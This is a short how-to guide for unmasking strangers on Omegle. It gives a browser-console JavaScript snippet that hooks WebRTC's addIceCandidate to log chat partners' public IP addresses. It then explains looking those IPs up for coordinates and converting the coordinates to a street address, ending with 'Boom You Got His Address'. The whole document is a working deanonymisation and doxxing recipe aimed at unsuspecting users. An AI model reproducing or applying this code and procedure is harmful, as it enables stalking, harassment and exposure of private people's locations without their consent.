## WHAT YOU WILL NEED.

### -VPN
### -CHROME BROWSER

#### 1.Turn On The VPN and Go To Omegle.com
#### 2.Rgiht Click And Click Inspect Element
#### 3.Go To Console
#### 4.Tpye This:


`window.oRTCPeerConnection  = window.oRTCPeerConnection || window.RTCPeerConnection`

`window.RTCPeerConnection = function(...args) {`
` const pc = new window.oRTCPeerConnection(...args)`

`pc.oaddIceCandidate = pc.addIceCandidate`

`pc.addIceCandidate = function(iceCandidate, ...rest) {`
` const fields = iceCandidate.candidate.split(' ')`

`if (fields[7] === 'srflx') {`
`console.log('IP Address:', fields[4])`
`}`
`return pc.oaddIceCandidate(iceCandidate, ...rest)`

`}`

`return pc`
`}`

#### 5.Start Video/Text Chat
#### 6.on The Console You Should Se The IPs Of The Users U Chat With.
#### 7.Go To: Tools - Intelligence X { https://intelx.io/ }
#### 8.Type His IP And Click Lookup
#### 9.You Should Get His Latitude &amp; Longitude
#### 10.Go To: GPS Coordinates Converter - Latitude and Longitude Converter 8
#### 11.Enter His Latitude &amp; Longitude
#### 12.Click “Get Address”
#### Boom You Got His Address

### Thank you all for your attention!

### * This Article was written by : muneebwanee (https://muneb.rf.gd)
